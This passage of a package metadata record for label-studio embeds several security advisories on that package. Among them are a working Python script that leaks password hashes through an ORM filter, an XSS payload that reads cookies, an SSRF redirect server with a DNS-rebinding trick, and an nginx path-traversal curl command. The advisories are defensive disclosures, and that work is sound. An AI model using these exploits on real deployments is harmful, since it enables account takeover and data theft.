Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.4.1.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.4.1.post1/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","google-api-core (==1.31.5)","google-auth (==1.35.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==1.5.0)","google-cloud-storage (~=1.29.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==0.5.1)","googleapis-common-protos (==1.52.0)","grpc-google-iam-v1 (==0.12.3)","Django (==3.1.14)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.4.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.10.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.3.0)","label-studio-converter (==0.0.39)","label-studio-tools (==0.0.0.dev11)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.4.1.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"1c378b1e2277f5ae36b564cc339369b6b4a27046d4ad627346815715359e96bc","md5":"74934ec1d0840b5cfb03926ca5e831c0","sha256":"740d548184233c5a2a96a81ed82a80773f771b110eed19c8a796c74af1b5d43d"},"downloads":-1,"filename":"label_studio-1.4.1.post1-py3-none-any.whl","has_sig":false,"md5_digest":"74934ec1d0840b5cfb03926ca5e831c0","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":42765144,"upload_time":"2022-02-12T00:43:55","upload_time_iso_8601":"2022-02-12T00:43:55.604276Z","url":"https://files.pythonhosted.org/packages/1c/37/8b1e2277f5ae36b564cc339369b6b4a27046d4ad627346815715359e96bc/label_studio-1.4.1.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"7907d4bee21e504c6e4ea738292144142ddf2ef1f612c14a6b213805bb5aefc9","md5":"aa0588ab38dc432e35e03168b6b16e97","sha256":"d651c365fad7e971ca7129f3a74943979449893fbcd71fc4dde0932e4e45e787"},"downloads":-1,"filename":"label-studio-1.4.1.post1.tar.gz","has_sig":false,"md5_digest":"aa0588ab38dc432e35e03168b6b16e97","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":41966206,"upload_time":"2022-02-12T00:44:06","upload_time_iso_8601":"2022-02-12T00:44:06.816028Z","url":"https://files.pythonhosted.org/packages/79/07/d4bee21e504c6e4ea738292144142ddf2ef1f612c14a6b213805bb5aefc9/label-studio-1.4.1.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't 